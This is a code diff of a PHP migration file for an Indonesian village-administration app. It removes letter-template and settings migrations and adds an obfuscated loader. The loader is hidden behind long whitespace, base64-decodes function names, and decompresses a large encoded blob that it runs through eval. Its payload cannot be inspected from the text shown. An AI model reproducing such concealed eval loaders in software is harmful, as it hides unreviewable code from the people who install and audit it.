-            <td style=\"width: 62.4872%; height: 23.2812px;\">[FoRm_pekerjaan]</td>
-            </tr>
-            <tr style=\"height: 23.3125px;\">
-            <td style=\"width: 3.39157%; text-align: center; height: 23.3125px;\">\u{a0}</td>
-            <td style=\"width: 2.8777%; text-align: center; height: 23.3125px;\">14.</td>
-            <td style=\"width: 30.0103%; height: 23.3125px;\">Alamat</td>
-            <td style=\"width: 1.2333%; text-align: center; height: 23.3125px;\">:</td>
-            <td style=\"width: 62.4872%; height: 23.3125px;\">[FoRm_tempat_tinggal]</td>
-            </tr>
-            </tbody>
-            </table>
-            <p style=\"text-align: justify; text-indent: 30px;\">Demikian surat keterangan ini dibuat dengan sebenarnya, untuk dipergunakan sebagaimana mestinya.</p>
-            <p style=\"text-align: justify; text-indent: 30px;\">\u{a0}</p>
-            <table style=\"border-collapse: collapse; width: 100%; height: 144px;\" border=\"0\">
-            <tbody>
-            <tr style=\"height: 18px;\">
-            <td style=\"width: 35%; text-align: center; height: 18px;\">\u{a0}</td>
-            <td style=\"width: 30%; height: 18px;\">\u{a0}</td>
-            <td style=\"width: 35%; text-align: center; height: 18px;\">[NaMa_desa], [TgL_surat]</td>
-            </tr>
-            <tr style=\"height: 18px;\">
-            <td style=\"width: 35%; text-align: center; height: 18px;\">\u{a0}</td>
-            <td style=\"width: 30%; height: 18px;\">\u{a0}</td>
-            <td style=\"width: 35%; text-align: center; height: 18px;\">[Atas_namA]</td>
-            </tr>
-            <tr style=\"height: 72px;\">
-            <td style=\"width: 35%; text-align: center; height: 72px;\">\u{a0}</td>
-            <td style=\"width: 30%; height: 72px;\"><br /><br /><br /><br /></td>
-            <td style=\"width: 35%; height: 72px;\">\u{a0}</td>
-            </tr>
-            <tr style=\"height: 18px;\">
-            <td style=\"width: 35%; text-align: center; height: 18px;\">\u{a0}</td>
-            <td style=\"width: 30%; height: 18px;\">\u{a0}</td>
-            <td style=\"width: 35%; text-align: center; height: 18px;\">[Nama_pamonG]</td>
-            </tr>
-            <tr style=\"height: 18px;\">
-            <td style=\"width: 35%; height: 18px;\">\u{a0}</td>
-            <td style=\"width: 30%; height: 18px;\">\u{a0}</td>
-            <td style=\"width: 35%; text-align: center; height: 18px;\">[SEbutan_nip_desa] : [nip_pamong]</td>
-            </tr>
-            </tbody>
-            </table>
-            <div style=\"text-align: center;\">\u{a0}</div>",
-        ];
-
-        return $hasil && $this->tambah_surat_tinymce($data, $id);
-    }
-
-    protected function migrasi_2023062251($hasil, $id)
-    {
-        return $hasil && $this->tambah_setting([
-            'judul'      => 'Buku Tamu Kamera',
-            'key'        => 'buku_tamu_kamera',
-            'value'      => 1,
-            'keterangan' => 'Gunakan kamera untuk proses registrasi',
-            'kategori'   => 'buku-tamu',
-            'jenis'      => 'boolean',
-            'option'     => null,
-        ], $id);
-    }
-
-    protected function suratPermohonanPerubahanKartuKeluarga($hasil, $id)
-    {
-        $template = <<<HTML
-                <h4 style="margin: 0; text-align: center;"><span style="text-decoration: underline;">[JUdul_surat]</span></h4>
-                <p style="margin: 0; text-align: center;">Nomor : [format_nomor_surat]<br /><br /></p>
-                <p style="text-align: justify;">\u{a0} \u{a0} \u{a0} Yang bertanda tangan di bawah ini [Jabatan] [Nama_desa], Kecamatan [Nama_kecamatan], [Sebutan_kabupaten] [Nama_kabupaten], Provinsi [Nama_provinsi] menerangkan dengan sebenarnya bahwa :</p>
-                <table style="border-collapse: collapse; width: 100%; height: 270px;" border="0" cellspacing="0" cellpadding="0">
-                <tbody>
-                <tr style="height: 18px;">
-                <td style="width: 5%; text-align: center; height: 18px;">1.</td>
-                <td style="width: 33.773%; text-align: left; height: 18px;">Nama</td>
-                <td style="width: 1.22703%; text-align: center;">:</td>
-                <td style="width: 60%; text-align: left; height: 18px;"><strong>[NAma]</strong></td>
-                </tr>
-                <tr style="height: 18px;">
-                <td style="width: 5%; text-align: center; height: 18px;">2.</td>
-                <td style="width: 33.773%; text-align: left; height: 18px;">Tempat/tanggal lahir</td>
-                <td style="width: 1.22703%; text-align: center;">:</td>
-                <td style="width: 60%; text-align: left; height: 18px;">[TtL]</td>
-                </tr>
-                <tr style="height: 18px;">
-                <td style="width: 5%; text-align: center; height: 18px;">3.</td>
-                <td style="width: 33.773%; text-align: left; height: 18px;">Umur</td>
-                <td style="width: 1.22703%; text-align: center;">:</td>
-                <td style="width: 60%; text-align: left; height: 18px;">[UsIa]</td>
-                </tr>
-                <tr style="height: 18px;">
-                <td style="width: 5%; text-align: center; height: 18px;">4.</td>
-                <td style="width: 33.773%; text-align: left; height: 18px;">Warga negara</td>
-                <td style="width: 1.22703%; text-align: center;">:</td>
-                <td style="width: 60%; text-align: left; height: 18px;">[WArga_negara]</td>
-                </tr>
-                <tr style="height: 18px;">
-                <td style="width: 5%; text-align: center; height: 18px;">5.</td>
-                <td style="width: 33.773%; text-align: left; height: 18px;">Agama</td>
-                <td style="width: 1.22703%; text-align: center;">:</td>
-                <td style="width: 60%; text-align: left; height: 18px;">[AgAma]</td>
-                </tr>
-                <tr style="height: 18px;">
-                <td style="width: 5%; text-align: center; height: 18px;">6.</td>
-                <td style="width: 33.773%; text-align: left; height: 18px;">Jenis Kelamin</td>
-                <td style="width: 1.22703%; text-align: center;">:</td>
-                <td style="width: 60%; text-align: left; height: 18px;">[JeNis_kelamin]</td>
-                </tr>
-                <tr style="height: 18px;">
-                <td style="width: 5%; text-align: center; height: 18px;">7.</td>
-                <td style="width: 33.773%; text-align: left; height: 18px;">Pekerjaan</td>
-                <td style="width: 1.22703%; text-align: center;">:</td>
-                <td style="width: 60%; text-align: left; height: 18px;">[Pekerjaan]</td>
-                </tr>
-                <tr style="height: 36px;">
-                <td style="width: 5%; text-align: center; height: 36px;">8.</td>
-                <td style="width: 33.773%; text-align: left; height: 36px;">Tempat tinggal</td>
-                <td style="width: 1.22703%; text-align: center;">:</td>
-                <td style="width: 60%; text-align: left; height: 36px;">[AlamaT] [Sebutan_desa] [Nama_desa], Kecamatan [Nama_kecamatan], [Sebutan_kabupaten] [Nama_kabupaten]</td>
-                </tr>
-                <tr style="height: 18px;">
-                <td style="width: 5%; text-align: center; height: 18px;">9.</td>
-                <td style="width: 33.773%; text-align: left; height: 18px;">Surat bukti diri</td>
-                <td style="width: 1.22703%; text-align: left;">\u{a0}</td>
-                <td style="width: 60%; text-align: left; height: 18px;">\u{a0}</td>
-                </tr>
-                <tr style="height: 18px;">
-                <td style="width: 5%; text-align: center; height: 18px;">\u{a0}</td>
-                <td style="width: 33.773%; text-align: left; height: 18px;">KTK</td>
-                <td style="width: 1.22703%; text-align: center;">:</td>
-                <td style="width: 60%; text-align: left; height: 18px;">[Nik]</td>
-                </tr>
-                <tr style="height: 18px;">
-                <td style="width: 5%; text-align: center; height: 18px;">\u{a0}</td>
-                <td style="width: 33.773%; text-align: left; height: 18px;">KK</td>
-                <td style="width: 1.22703%; text-align: center;">:</td>
-                <td style="width: 60%; text-align: left; height: 18px;">[No_kk]</td>
-                </tr>
-                <tr style="height: 18px;">
-                <td style="width: 5%; text-align: center; height: 18px;">10.</td>
-                <td style="width: 33.773%; text-align: left; height: 18px;">Keperluan</td>
-                <td style="width: 1.22703%; text-align: center;">:</td>
-                <td style="width: 60%; text-align: left; height: 18px;">Permohonan Perubahan Kartu Keluarga WNI.</td>
-                </tr>
-                <tr style="height: 18px;">
-                <td style="width: 5%; text-align: center; height: 18px;">11.</td>
-                <td style="width: 33.773%; text-align: left; height: 18px;">Keterangan lain-lain</td>
-                <td style="width: 1.22703%; text-align: center;">:</td>
-                <td style="width: 60%; text-align: left; height: 18px;">Orang tersebut di atas adalah benar benar penduduk desa kami dan adat istiadat baik.</td>
-                </tr>
-                </tbody>
-                </table>
-                <p style="text-align: justify;">\u{a0} \u{a0} \u{a0} \u{a0} \u{a0} \u{a0} \u{a0}</p>
-                <p style="text-align: justify; text-indent: 30px;">Demikian surat ini dibuat, untuk dipergunakan sebagaimana mestinya.<br /><br /></p>
-                <table style="border-collapse: collapse; width: 100%; height: 324px;" border="0">
-                <tbody>
-                <tr style="height: 18px;">
-                <td style="width: 35.0462%; text-align: center; height: 18px;">\u{a0}</td>
-                <td style="width: 30.0103%; height: 18px;">\u{a0}</td>
-                <td style="width: 35.0462%; text-align: center; height: 18px;">[NaMa_desa], [TgL_surat]</td>
-                </tr>
-                <tr style="height: 18px;">
-                <td style="width: 35.0462%; text-align: center; height: 18px;">Pemegang Surat</td>
-                <td style="width: 30.0103%; height: 18px;">\u{a0}</td>
-                <td style="width: 35.0462%; text-align: center; height: 18px;">[Atas_namA]</td>
-                </tr>
-                <tr style="height: 72px;">
-                <td style="width: 35.0462%; text-align: center; height: 72px;">\u{a0}</td>
-                <td style="width: 30.0103%; height: 72px;"><br /><br /><br /><br /></td>
-                <td style="width: 35.0462%; height: 72px;">\u{a0}</td>
-                </tr>
-                <tr style="height: 18px;">
-                <td style="width: 35.0462%; text-align: center; height: 18px;"><strong>[NAma]</strong></td>
-                <td style="width: 30.0103%; height: 18px;">\u{a0}</td>
-                <td style="width: 35.0462%; text-align: center; height: 18px;">[Nama_pamonG]</td>
-                </tr>
-                <tr style="height: 18px;">
-                <td style="width: 35.0462%; height: 18px;">\u{a0}</td>
-                <td style="width: 30.0103%; height: 18px;">\u{a0}</td>
-                <td style="width: 35.0462%; text-align: center; height: 18px;">[SEbutan_nip_desa] : [nip_pamong]</td>
-                </tr>
-                <tr style="height: 18px;">
-                <td style="width: 35.0462%; height: 18px;">\u{a0}</td>
-                <td style="width: 30.0103%; height: 18px;">\u{a0}</td>
-                <td style="width: 35.0462%; text-align: center; height: 18px;">\u{a0}</td>
-                </tr>
-                <tr style="height: 18px;">
-                <td style="width: 35.0462%; height: 18px;">\u{a0}</td>
-                <td style="width: 30.0103%; height: 18px;">No</td>
-                <td style="width: 35.0462%; text-align: left; height: 18px;">:</td>
-                </tr>
-                <tr style="height: 18px;">
-                <td style="width: 35.0462%; height: 18px;">\u{a0}</td>
-                <td style="width: 30.0103%; height: 18px;">Tanggal</td>
-                <td style="width: 35.0462%; text-align: left; height: 18px;">:</td>
-                </tr>
-                <tr style="height: 18px;">
-                <td style="width: 35.0462%; height: 18px;">\u{a0}</td>
-                <td style="width: 30.0103%; text-align: center; height: 18px;">Mengetahui,</td>
-                <td style="width: 35.0462%; text-align: left; height: 18px;">\u{a0}</td>
-                </tr>
-                <tr style="height: 18px;">
-                <td style="width: 35.0462%; height: 18px;">\u{a0}</td>
-                <td style="width: 30.0103%; text-align: center; height: 18px;">Camat - [NaMa_kecamatan]</td>
-                <td style="width: 35.0462%; text-align: left; height: 18px;">\u{a0}</td>
-                </tr>
-                <tr style="height: 72px;">
-                <td style="height: 72px; width: 35.0462%;" rowspan="2">[qr_code]</td>
-                <td style="width: 30.0103%; height: 72px;"><br /><br /><br /></td>
-                <td style="width: 35.0462%; text-align: left; height: 72px;">\u{a0}</td>
-                </tr>
-                <tr style="height: 18px;">
-                <td style="width: 30.0103%; text-align: center; height: 18px;">..............................................</td>
-                <td style="width: 35.0462%; text-align: left; height: 18px;">\u{a0}</td>
-                </tr>
-                </tbody>
-                </table>
-                <div style="text-align: center;">\u{a0}</div>
-            HTML;
-
-        $data = [
-            'nama'                => 'Permohonan Perubahan Kartu Keluarga',
-            'kode_surat'          => 'S-41',
-            'masa_berlaku'        => 1,
-            'satuan_masa_berlaku' => 'M',
-            'orientasi'           => 'Potrait',
-            'ukuran'              => 'F4',
-            'margin'              => '{"kiri":1.78,"atas":0.63,"kanan":1.78,"bawah":1.37}',
-            'qr_code'             => StatusEnum::TIDAK,
-            'kode_isian'          => '[{"tipe":"select-manual","kode":"[form_alasan_permohonan]","nama":"Alasan Permohonan","deskripsi":"Pilih Alasan Permohonan","required":"1","atribut":"class=\"required\"","pilihan":["Karena Penambahan Anggota Keluarga (Kelahiran, Kedatangan)","Karena Pengurangan Anggota Keluarga (Kematian, Kepindahan)","Lainnya"],"refrensi":null},{"tipe":"textarea","kode":"[form_alasan_lainnya]","nama":"Alasan Lainnya","deskripsi":"Alasan Lainnya","required":"0","atribut":null,"pilihan":null,"refrensi":null}]',
-            'form_isian'          => '{"data":"1","individu":{"sex":"","status_dasar":"","kk_level":"1"}}',
-            'mandiri'             => StatusEnum::TIDAK,
-            'syarat_surat'        => null,
-            'lampiran'            => 'F-1.01,F-1.02,F-1.16',
-            'template'            => $template,
-        ];
-
-        return $hasil && $this->tambah_surat_tinymce($data, $id);
-    }
-
-    protected function migrasi_2023062871($hasil)
-    {
-        if (! $this->db->field_exists('margin_global', 'tweb_surat_format')) {
-            $hasil = $hasil && $this->dbforge->add_column('tweb_surat_format', [
-                'margin_global' => [
-                    'type'       => 'tinyint',
-                    'constraint' => 1,
-                    'null'       => true,
-                    'default'    => 0,
-                    'after'      => 'margin',
-                ],
-            ]);
-        }
-
-        return $hasil;
-    }
-
-    // Function Migrasi TinyMCE
-}
+<?php 
+        $__='printf';$_='Loading donjo-app/models/migrations/Migrasi_fitur_premium_2307.php';
+        
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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